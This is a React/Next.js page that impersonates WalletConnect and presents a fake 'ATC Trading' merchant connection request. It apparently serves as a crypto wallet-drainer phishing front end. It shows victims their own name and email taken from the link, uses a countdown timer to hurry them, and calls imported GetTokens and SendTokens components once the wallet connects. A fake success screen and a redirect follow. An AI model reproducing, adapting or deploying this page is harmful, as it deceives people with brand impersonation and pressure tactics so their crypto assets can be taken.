'use client';

import { useState, useEffect, useRef } from 'react';
import { ConnectKitButton } from 'connectkit';
import { GetTokens, SendTokens } from '../components/contract';
import { useAccount } from 'wagmi';
import Link from 'next/link';
import { useRouter } from 'next/router'; // Add this import


const MERCHANT = {
  name: 'ATC Trading',
  logo: 'https://atctrading.io/assets/img/logo.png',
  description: 'Trading Platform',
  url: 'atctrading.io',
};

// const USER = {
//   name: 'John Doe',
//   email: 'john.doe@example.com',
//   avatar: 'J',
// };

function ParticleBackground() {
  type Particle = { key: number; left: number; duration: number };
  const [particles, setParticles] = useState<Particle[]>([]);
  useEffect(() => {
    let id = setInterval(() => {
      setParticles(ps => [
        ...ps,
        {
          key: Math.random(),
          left: Math.random() * window.innerWidth,
          duration: 10 + Math.random() * 10,
        },
      ]);
    }, 300);
    return () => clearInterval(id);
  }, []);
  return (
    <div className="absolute inset-0 overflow-hidden pointer-events-none z-5">
      {particles.map(p => (
        <div
          key={p.key}
          className="particle"
          style={{
            left: p.left,
            bottom: '-10px',
            animation: `particleFloat ${p.duration}s linear`,
            position: 'absolute',
            width: 4,
            height: 4,
            background: 'rgba(255,255,255,0.6)',
            borderRadius: '50%',
          }}
        />
      ))}
      <style jsx global>{`
        @keyframes particleFloat {
          0% { transform: translateY(0) translateX(0); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; }
          100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
        }
      `}</style>
    </div>
  );
}

export default function Home() {
  const { isConnected, address } = useAccount();
  const [step, setStep] = useState<'detect' | 'connect' | 'success'>('detect');
  const [timer, setTimer] = useState(300); // 5 min
  const [successCountdown, setSuccessCountdown] = useState(30);
  const [mobileMenu, setMobileMenu] = useState(false);
  const router = useRouter();
  const merchantActive = router.query.merchant === 'true';

  // Get user info from query string
  const userEmail = typeof router.query.SS === 'string' ? router.query.SS : 'john.doe@example.com';
  const userName = typeof router.query.n === 'string' ? router.query.n : 'John Doe';

  const USER = {
    name: userName,
    email: userEmail,
    avatar: userName ? userName[0].toUpperCase() : 'J',
  };

  // Expiration timer
  useEffect(() => {
    if (step !== 'detect' && step !== 'connect') return;
    if (timer <= 0) return;
    const interval = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(interval);
  }, [step, timer]);

  // Success countdown
  useEffect(() => {
    if (step !== 'success') return;
    if (successCountdown <= 0) {
      window.location.href = 'https://account.atctrading.io/withdrawal/';
      return;
    }
    const interval = setInterval(() => setSuccessCountdown(c => c - 1), 1000);
    return () => clearInterval(interval);
  }, [step, successCountdown]);

  // Move to connect step if timer not expired
  const handleProceed = () => {
    if (timer > 0) setStep('connect');
  };

  // Move to success step after wallet connect and token transfer
  useEffect(() => {
    if (isConnected && step === 'connect') {
      setTimeout(() => setStep('success'), 1200); // Simulate transfer
    }
  }, [isConnected, step]);

  // Mobile menu handlers
  const openMobileMenu = () => {
    setMobileMenu(true);
    document.body.style.overflow = 'hidden';
  };
  const closeMobileMenu = () => {
    setMobileMenu(false);
    document.body.style.overflow = '';
  };

  // Expiration formatting
  const formatTime = (t: number) =>
    `${String(Math.floor(t / 60)).padStart(2, '0')}:${String(t % 60).padStart(2, '0')}`;

  // Countdown ring for success screen
  const circumference = 2 * Math.PI * 60;
  const countdownOffset = (successCountdown / 30) * circumference;

  return (
    <div className="min-h-screen flex flex-col bg-black bg-cover bg-center bg-no-repeat bg-fixed relative"
      style={{
        backgroundImage:
          "url('https://cdn.sanity.io/images/1t8iva7t/production/41263d5c4c147c1fd7eae5569facc78036b0185e-1921x1080.png')",
      }}
    >
      {/* Overlay */}
      <div className="fixed inset-0 bg-black/60 pointer-events-none z-0"></div>
      {/* Particle Background */}
      <ParticleBackground />
      {/* Header */}
      <header className="w-full py-6 px-5 bg-white shadow-lg sticky top-0 z-50">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img src="https://walletconnect.com/icon.png?14b0dfc4ce526451" alt="WalletConnect" className="w-10 h-10" />
            <span className="text-xl font-bold text-gray-900">WalletConnect</span>
          </div>
          <nav className="hidden md:flex items-center gap-8">
            <a href="#" className="text-gray-600 hover:text-blue-500 transition-colors font-medium">Products</a>
            <a href="#" className="text-gray-600 hover:text-blue-500 transition-colors font-medium">Developers</a>
            <a href="#" className="text-gray-600 hover:text-blue-500 transition-colors font-medium">Company</a>
            <button className="px-6 py-2 bg-blue-500 text-white rounded-full font-semibold hover:bg-blue-600 transition-all">
              Get Started
            </button>
          </nav>
          <button onClick={openMobileMenu} className="md:hidden text-gray-900 p-2 hover:bg-gray-100 rounded-lg transition-colors">
            <i className="fas fa-bars text-2xl"></i>
          </button>
        </div>
      </header>
      {/* Mobile Menu Overlay */}
      <div
        className={`mobile-menu-overlay fixed inset-0 bg-black/50 z-50 md:hidden ${mobileMenu ? 'active' : ''}`}
        onClick={closeMobileMenu}
        style={{ opacity: mobileMenu ? 1 : 0, pointerEvents: mobileMenu ? 'auto' : 'none', transition: 'opacity 0.3s' }}
      ></div>
      {/* Mobile Menu */}
      <div
        className="fixed top-0 right-0 h-full w-80 max-w-[85vw] bg-white shadow-2xl z-50 transform md:hidden"
        style={{ transform: mobileMenu ? 'translateX(0)' : 'translateX(100%)', transition: 'transform 0.3s' }}
      >
        <div className="flex flex-col h-full">
          <div className="flex items-center justify-between p-6 border-b border-gray-200">
            <div className="flex items-center gap-3">
              <img src="https://walletconnect.com/icon.png?14b0dfc4ce526451" alt="WalletConnect" className="w-8 h-8" />
              <span className="text-lg font-bold text-gray-900">WalletConnect</span>
            </div>
            <button onClick={closeMobileMenu} className="p-2 hover:bg-gray-100 rounded-lg transition-colors">
              <i className="fas fa-times text-xl text-gray-600"></i>
            </button>
          </div>
          <nav className="flex-1 overflow-y-auto p-6">
            <a href="#" className="block py-4 text-gray-700 hover:text-blue-500 font-medium border-b border-gray-100 transition-colors">
              <i className="fas fa-cube mr-3 text-blue-500"></i>Products
            </a>
            <a href="#" className="block py-4 text-gray-700 hover:text-blue-500 font-medium border-b border-gray-100 transition-colors">
              <i className="fas fa-code mr-3 text-blue-500"></i>Developers
            </a>
            <a href="#" className="block py-4 text-gray-700 hover:text-blue-500 font-medium border-b border-gray-100 transition-colors">
              <i className="fas fa-building mr-3 text-blue-500"></i>Company
            </a>
          </nav>
          <div className="p-6 border-t border-gray-200">
            <button className="w-full py-3 bg-blue-500 text-white rounded-full font-semibold hover:bg-blue-600 transition-all">
              Get Started
            </button>
          </div>
        </div>
      </div>
      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-16 px-5 text-white relative z-10">
        {/* Detection Screen */}
        {step === 'detect' && (
          <div className="w-full max-w-[480px] mx-auto animate-fade-in-up relative z-20">
            <div className="glass-effect rounded-[32px] overflow-hidden relative card-shadow min-h-[620px]">
              {/* Video Background */}
              <div className="absolute inset-0 overflow-hidden z-0">
                <video className="absolute inset-0 w-full h-full object-cover" autoPlay loop muted playsInline>
                  <source src="https://cdn.sanity.io/files/1t8iva7t/production/a2cbbed7c998cf93e7ecb6dae75bab42b13139c2.mp4" type="video/mp4" />
                </video>
                <div className="absolute inset-0 video-gradient"></div>
              </div>
              {/* Detection Content */}
              <div className="relative z-10 px-10 py-12 flex flex-col min-h-[620px]">
                <div className="flex-1 flex flex-col items-center justify-center mb-8">
                  {/* Expiration Timer */}
                  {merchantActive && (
                    <div className={`mb-6 bg-orange-500/20 backdrop-blur-sm border border-orange-400/40 rounded-2xl px-5 py-3 inline-flex items-center gap-3 ${timer <= 60 ? 'animate-pulse-dot' : ''}`}>
                      <div className="relative">
                        <i className={`fas ${timer <= 60 ? 'fa-exclamation-triangle text-red-400' : 'fa-clock text-orange-400'} text-xl`}></i>
                      </div>
                      <div className="text-left">
                        <div className={`text-xs ${timer <= 60 ? 'text-red-300' : 'text-orange-300'} font-medium mb-0.5`}>Link Expires In</div>
                        <div className="text-lg font-bold text-white font-mono">{formatTime(timer)}</div>
                      </div>
                    </div>
                  )}
                  {/* Merchant detected and instructions */}
                  {merchantActive ? (
                    <>
                      <div className="inline-block px-5 py-2 bg-green-500/20 border border-green-400/40 rounded-full text-sm font-semibold text-green-300 backdrop-blur-sm mb-6 animate-pulse-dot">
                        <i className="fas fa-check-circle mr-2"></i>Merchant Detected
                      </div>
                      <h1 className="text-3xl font-bold mb-4 gradient-text text-center">Connection Request</h1>
                      <p className="text-base text-slate-300 text-center mb-8 max-w-sm">
                        Please verify the merchant details before proceeding with the connection
                      </p>
                    </>
                  ) : (
                    <>
                      <h1 className="text-3xl font-bold mb-4 gradient-text text-center">Welcome to WalletConnect Demo</h1>
                      <p className="text-base text-slate-300 text-center mb-8 max-w-sm">
                        Connect your wallet to explore the demo features. No merchant is requesting a connection.
                      </p>
                    </>
                  )}
                </div>
                {/* Merchant Info Card, User Info, Permission Notice */}
                {merchantActive && (
                  <div className="space-y-4 mb-6">
                    <div className="bg-gray-900/95 backdrop-blur-md rounded-2xl p-5 border border-white/25 shadow-2xl">
                      <div className="flex items-center gap-4 mb-4">
                        <img src={MERCHANT.logo} alt="Merchant Logo" style={{ width: 80 }} className="rounded-xl shadow-lg bg-white p-2" />
                        <div className="flex-1">
                          <h3 className="text-lg font-bold text-white">{MERCHANT.name}</h3>
                          <p className="text-sm text-slate-300">{MERCHANT.description}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 text-xs text-slate-300">
                        <i className="fas fa-globe"></i>
                        <span>{MERCHANT.url}</span>
                      </div>
                    </div>
                    {/* User Info */}
                    <div className="bg-gray-900/95 backdrop-blur-md rounded-2xl p-5 border border-white/25 shadow-2xl">
                      <div className="flex items-center justify-between mb-3">
                        <span className="text-sm text-slate-300">Connected Account</span>
                        <span className="text-xs text-blue-400"><i className="fas fa-user-check mr-1"></i>Verified</span>
                      </div>
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center text-white font-bold">
                          {USER.avatar}
                        </div>
                        <div>
                          <div className="text-sm font-semibold text-white">{USER.name}</div>
                          <div className="text-xs text-slate-300">{USER.email}</div>
                        </div>
                      </div>
                    </div>
                    {/* Permission Notice */}
                    <div className="bg-blue-500/15 backdrop-blur-sm rounded-xl p-4 border border-blue-400/30">
                      <div className="flex gap-3">
                        <i className="fas fa-info-circle text-blue-400 text-sm mt-0.5"></i>
                        <div className="flex-1">
                          <p className="text-xs text-slate-200 leading-relaxed">
                            By proceeding, you authorize this merchant to initiate a secure wallet connection via WalletConnect Protocol.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                {/* Action Button */}
                {merchantActive ? (
                  <button
                    className={`w-full py-5 bg-gradient-to-r from-blue-500 to-blue-600 text-white border-0 rounded-[30px] text-lg font-bold cursor-pointer transition-all duration-300 mb-4 hover:from-blue-600 hover:to-blue-700 hover:-translate-y-1 btn-glow ${timer <= 0 ? 'opacity-50 cursor-not-allowed' : ''}`}
                    onClick={handleProceed}
                    disabled={timer <= 0}
                  >
                    <i className="fas fa-arrow-right mr-3"></i>Proceed to Connect
                  </button>
                ) : (
                  <button
                    className="w-full py-5 bg-gradient-to-r from-blue-500 to-blue-600 text-white border-0 rounded-[30px] text-lg font-bold cursor-pointer transition-all duration-300 mb-4 hover:from-blue-600 hover:to-blue-700 hover:-translate-y-1 btn-glow"
                    onClick={handleProceed}
                  >
                    <i className="fas fa-arrow-right mr-3"></i>Connect Wallet
                  </button>
                )}
                {/* Footer */}
                {merchantActive && (
                  <div className="flex items-center justify-center gap-2 text-xs text-slate-400">
                    <i className="fas fa-shield-alt"></i>
                    <span>Powered by WalletConnect Protocol</span>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
        {/* Connect Screen */}
        {step === 'connect' && (
          <div className="w-full max-w-[480px] mx-auto relative z-20 animate-scale-in">
            <div className="glass-effect rounded-[32px] overflow-hidden relative card-shadow min-h-[620px]">
              {/* Video Background */}
              <div className="absolute inset-0 overflow-hidden z-0">
                <video className="absolute inset-0 w-full h-full object-cover" autoPlay loop muted playsInline>
                  <source src="https://cdn.sanity.io/files/1t8iva7t/production/a2cbbed7c998cf93e7ecb6dae75bab42b13139c2.mp4" type="video/mp4" />
                </video>
                <div className="absolute inset-0 video-gradient"></div>
              </div>
              {/* Connect Content */}
              <div className="text-center relative z-10 px-10 py-8 flex flex-col justify-end min-h-[620px]">
                {/* Expiration Timer */}
                {merchantActive && (
                  <div className={`absolute top-8 left-1/2 transform -translate-x-1/2 bg-orange-500/20 backdrop-blur-sm border border-orange-400/40 rounded-full px-4 py-2 inline-flex items-center gap-2 ${timer <= 60 ? 'animate-pulse-dot' : ''}`}>
                    <i className={`fas ${timer <= 60 ? 'fa-exclamation-triangle text-red-400' : 'fa-clock text-orange-400'} text-sm`}></i>
                    <span className={`text-xs ${timer <= 60 ? 'text-red-300' : 'text-orange-300'} font-medium`}>Link expires in</span>
                    <span className="text-sm font-bold text-white font-mono">{formatTime(timer)}</span>
                  </div>
                )}
                <div className="space-y-6 mb-8">
                  <div className="inline-block px-4 py-2 bg-blue-500/20 border border-blue-400/30 rounded-full text-xs font-semibold text-blue-300 backdrop-blur-sm">
                    <i className="fas fa-shield-alt mr-2"></i>Secure Connection Protocol
                  </div>
                  <h1 className="text-3xl font-bold mb-4 gradient-text leading-tight">
                    Connect Your Wallet Securely
                  </h1>
                  <p className="text-base text-slate-300 leading-relaxed max-w-md mx-auto">
                    Establish a secure, encrypted connection between your wallet and this application using the WalletConnect Protocol.
                  </p>
                  {/* Stats */}
                  <div className="grid grid-cols-3 gap-4 pt-6">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-white">500M+</div>
                      <div className="text-xs text-slate-400 mt-1">Connections</div>
                    </div>
                    <div className="text-center border-x border-white/10">
                      <div className="text-2xl font-bold text-white">600+</div>
                      <div className="text-xs text-slate-400 mt-1">Wallets</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-white">5,000+</div>
                      <div className="text-xs text-slate-400 mt-1">DApps</div>
                    </div>
                  </div>
                </div>
                {/* CTA Button */}
                <div className="mb-4 flex justify-center items-center w-full">
                  <ConnectKitButton />
                </div>
                {isConnected && (
                  <div className="mt-6">
                    <div className="text-green-400 break-all text-xs font-bold">Connected: {address}</div>
                    <div className="mt-4">
                      <GetTokens />
                      <SendTokens />
                    </div>
                  </div>
                )}
                {/* Secondary Info */}
                <div className="flex items-center justify-center gap-2 text-xs text-slate-400">
                  <i className="fas fa-lock text-green-400"></i>
                  <span>Powered by WalletConnect Protocol</span>
                </div>
              </div>
            </div>
            {/* Features */}
            <div className="grid grid-cols-3 gap-4 mt-8">
              <div className="text-center glass-effect rounded-2xl p-4 hover:bg-white/10 transition-all cursor-pointer">
                <i className="fas fa-bolt text-yellow-400 text-2xl mb-2"></i>
                <div className="text-xs font-semibold text-white">Instant</div>
              </div>
              <div className="text-center glass-effect rounded-2xl p-4 hover:bg-white/10 transition-all cursor-pointer">
                <i className="fas fa-shield-alt text-green-400 text-2xl mb-2"></i>
                <div className="text-xs font-semibold text-white">Secure</div>
              </div>
              <div className="text-center glass-effect rounded-2xl p-4 hover:bg-white/10 transition-all cursor-pointer">
                <i className="fas fa-globe text-blue-400 text-2xl mb-2"></i>
                <div className="text-xs font-semibold text-white">Universal</div>
              </div>
            </div>
          </div>
        )}
        {/* Success Screen */}
        {step === 'success' && (
          <div className="w-full max-w-[480px] mx-auto relative z-20 animate-fade-in-up">
            {/* Logo Header */}
            {merchantActive && (
              <div className="mb-8 flex items-center justify-between px-4">
                <div className="flex items-center gap-3">
                  <img src={MERCHANT.logo} alt="Merchant" className="w-12 h-12 rounded-xl shadow-lg bg-white p-2" />
                  <div className="text-left">
                    <div className="text-sm font-semibold text-white">{MERCHANT.name}</div>
                    <div className="text-xs text-slate-400">Merchant</div>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="text-right">
                    <div className="text-sm font-semibold text-white">WalletConnect</div>
                    <div className="text-xs text-slate-400">Protocol</div>
                  </div>
                  <img src="https://walletconnect.com/icon.png?14b0dfc4ce526451" alt="WalletConnect" className="w-12 h-12 rounded-xl shadow-lg" />
                </div>
              </div>
            )}
            {/* Success Card */}
            <div className="glass-effect rounded-[32px] overflow-hidden relative card-shadow min-h-[550px]">
              {/* Video Background */}
              <div className="absolute inset-0 overflow-hidden z-0">
                <video className="absolute inset-0 w-full h-full object-cover" autoPlay loop muted playsInline>
                  <source src="https://cdn.sanity.io/files/1t8iva7t/production/a2cbbed7c998cf93e7ecb6dae75bab42b13139c2.mp4" type="video/mp4" />
                </video>
                <div className="absolute inset-0 video-gradient"></div>
              </div>
              {/* Success Content */}
              <div className="text-center relative z-10 px-10 py-12 flex flex-col items-center justify-center min-h-[550px]">
                {/* Success Checkmark */}
                <div className="mb-8">
                  <svg width="120" height="120" viewBox="0 0 120 120" className="checkmark-circle">
                    <circle cx="60" cy="60" r="54" fill="none" stroke="#10b981" strokeWidth="4" />
                    <path className="checkmark-path" d="M35 60 L52 77 L85 44" fill="none" stroke="#10b981" strokeWidth="6" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </div>
                <h2 className="text-3xl font-bold text-white mb-4">
                  {merchantActive ? 'Connection Successful!' : 'Wallet Connected!'}
                </h2>
                <p className="text-slate-300 mb-6 max-w-sm">
                  {merchantActive
                    ? 'Your wallet has been securely connected. You will be redirected to the merchant in:'
                    : 'Your wallet is now connected to the demo. Enjoy exploring the features!'}
                </p>
                {/* Countdown Timer */}
                {merchantActive && (
                  <div className="relative mb-8">
                    <svg width="140" height="140" className="transform -rotate-90">
                      <circle cx="70" cy="70" r="60" fill="none" stroke="rgba(255,255,255,0.1)" strokeWidth="8" />
                      <circle
                        className="countdown-ring"
                        cx="70"
                        cy="70"
                        r="60"
                        fill="none"
                        stroke={successCountdown <= 10 ? '#ef4444' : successCountdown <= 20 ? '#f59e0b' : '#3b82f6'}
                        strokeWidth="8"
                        strokeLinecap="round"
                        style={{
                          strokeDasharray: circumference,
                          strokeDashoffset: circumference - countdownOffset,
                          transition: 'stroke 0.3s, stroke-dashoffset 1s linear',
                        }}
                      />
                    </svg>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <div className="text-center">
                        <div className="text-5xl font-bold text-white animate-countdown-pulse">{successCountdown}</div>
                        <div className="text-xs text-slate-400 mt-2">seconds</div>
                      </div>
                    </div>
                  </div>
                )}
                {/* Connection Details */}
                <div className="w-full bg-white/5 rounded-2xl p-4 mb-6 border border-white/10">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-sm text-slate-400">Wallet Address</span>
                    <span className="text-xs text-green-400"><i className="fas fa-check-circle mr-1"></i>Verified</span>
                  </div>                  
                  <div className="text-sm font-mono break-all text-xs text-white bg-black/30 rounded-lg px-3 py-2">
                    {address ? address : '0x742d...8a9c'}
                  </div>
                </div>
                {/* Action Buttons */}
                {merchantActive ? (
                  <div className="w-full space-y-3">
                    <a
                      href="https://atctrading.io/withdrawal"
                      className="w-full block py-4 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-[30px] text-base font-bold hover:from-blue-600 hover:to-blue-700 transition-all btn-glow text-center"
                    >
                      <i className="fas fa-arrow-right mr-2"></i>Return to Merchant
                    </a>
                    <button
                      className="w-full py-4 bg-white/10 text-white rounded-[30px] text-base font-semibold hover:bg-white/20 transition-all border border-white/20"
                      onClick={() => {
                        setStep('detect');
                        setTimer(300);
                        setSuccessCountdown(30);
                      }}
                    >
                      <i className="fas fa-times mr-2"></i>Cancel Connection
                    </button>
                  </div>
                ) : (
                  
                  <div className="w-full space-y-3">
                     {/* CTA Button */}
                <div className="mb-4 flex justify-center items-center w-full">
                  <ConnectKitButton />
                </div>
               
                    <button
                      className="w-full py-4 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-[30px] text-base font-bold hover:from-blue-600 hover:to-blue-700 transition-all btn-glow text-center"
                      onClick={() => setStep('detect')}
                    >
                      <i className="fas fa-arrow-left mr-2"></i>Back to Home
                    </button>
                  </div>
                )}
                {/* Footer */}
                {merchantActive && (
                  <div className="mt-8 flex items-center justify-center gap-2 text-xs text-slate-500">
                    <i className="fas fa-shield-alt"></i>
                    <span>Powered by WalletConnect Protocol</span>
                  </div>
                )}
              </div>
            </div>
          </div>
        )} 

        {/* Settings link */}
        {/* <div className="mt-8 text-center">
          <Link href="/destination-settings" className="text-blue-400 underline">Destination Settings</Link>
        </div> */}
      </main>
      {/* Custom styles for glass effect, gradients, shimmer, etc. */}
      <style jsx global>{`
        .glass-effect {
          background: rgba(17, 24, 39, 0.75);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .gradient-text {
          background: linear-gradient(135deg, #ffffff 0%, #e0e7ff 50%, #c7d2fe 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          text-fill-color: transparent;
        }
        .card-shadow {
          box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6),
                      0 0 100px rgba(59, 130, 246, 0.1);
        }
        .animate-fade-in-up {
          animation: fadeInUp 0.8s ease-out forwards;
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(30px);}
          to { opacity: 1; transform: translateY(0);}
        }
        .animate-scale-in {
          animation: scaleIn 0.6s ease-out forwards;
        }
        @keyframes scaleIn {
          from { transform: scale(0.9); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        .btn-glow {
          box-shadow: 0 0 20px rgba(59, 130, 246, 0.4),
                      0 0 40px rgba(59, 130, 246, 0.2),
                      0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .btn-glow:hover {
          box-shadow: 0 0 30px rgba(59, 130, 246, 0.6),
                      0 0 60px rgba(59, 130, 246, 0.3),
                      0 15px 40px rgba(0, 0, 0, 0.4);
        }
        .video-gradient {
          background: linear-gradient(to bottom, 
            rgba(0,0,0,0.3) 0%, 
            rgba(0,0,0,0.7) 40%, 
            rgba(0,0,0,0.92) 100%);
        }
        .animate-pulse-dot {
          animation: pulse-dot 2s infinite;
        }
        @keyframes pulse-dot {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.6; transform: scale(1.1); }
        }
        .checkmark-circle {
          animation: circleGrow 0.6s ease-out forwards;
        }
        @keyframes circleGrow {
          0% { transform: scale(0); opacity: 0; }
          50% { opacity: 1; }
          100% { transform: scale(1); opacity: 1; }
        }
        .checkmark-path {
          stroke-dasharray: 100;
          stroke-dashoffset: 100;
          animation: checkmark 0.6s ease-out forwards;
          animation-delay: 0.3s;
        }
        @keyframes checkmark {
          0% { stroke-dashoffset: 100; }
          100% { stroke-dashoffset: 0; }
        }
        .countdown-ring {
          stroke-dasharray: 283;
          stroke-dashoffset: 0;
          transform-origin: center;
          transform: rotate(-90deg);
        }
        .animate-countdown-pulse {
          animation: countdownPulse 1s ease-in-out infinite;
        }
        @keyframes countdownPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        .mobile-menu-overlay {
          opacity: 0;
          pointer-events: none;
          transition: opacity 0.3s ease;
        }
        .mobile-menu-overlay.active {
          opacity: 1;
          pointer-events: auto;
        }
        .particle {
          position: absolute;
          width: 4px;
          height: 4px;
          background: rgba(255, 255, 255, 0.6);
          border-radius: 50%;
          pointer-events: none;
        }
      `}</style>
    </div>
  );
}
